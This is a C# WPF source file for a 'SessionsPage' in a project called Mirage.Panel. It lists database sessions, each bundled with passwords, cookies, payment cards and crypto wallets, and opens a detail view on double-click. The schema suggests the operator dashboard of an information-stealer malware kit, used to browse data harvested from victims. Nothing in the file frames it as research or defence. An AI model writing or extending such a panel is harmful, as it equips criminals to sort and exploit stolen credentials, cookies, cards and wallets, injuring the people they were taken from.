using System.Windows.Controls;
using System.Windows.Input;
using Microsoft.EntityFrameworkCore;
using Mirage.Panel.Data;
using Mirage.Panel.Models;

namespace Mirage.Panel.Views;

public partial class SessionsPage : Page
{
    public SessionsPage()
    {
        InitializeComponent();
        LoadSessions();
    }

    private void LoadSessions()
    {
        var factory = ((App)App.Current).Services.GetService(typeof(IDbContextFactory<AppDbContext>))
            as IDbContextFactory<AppDbContext>;
        if (factory == null) return;

        using var db = factory.CreateDbContext();
        SessionsGrid.ItemsSource = db.Sessions
            .Include(s => s.Passwords)
            .Include(s => s.Cookies)
            .Include(s => s.Cards)
            .Include(s => s.Wallets)
            .OrderByDescending(s => s.CreatedAt)
            .ToList();
    }

    private void SessionsGrid_MouseDoubleClick(object sender, MouseButtonEventArgs e)
    {
        if (SessionsGrid.SelectedItem is Session session)
        {
            NavigationService?.Navigate(new SessionDetailPage(session.Id));
        }
    }
}
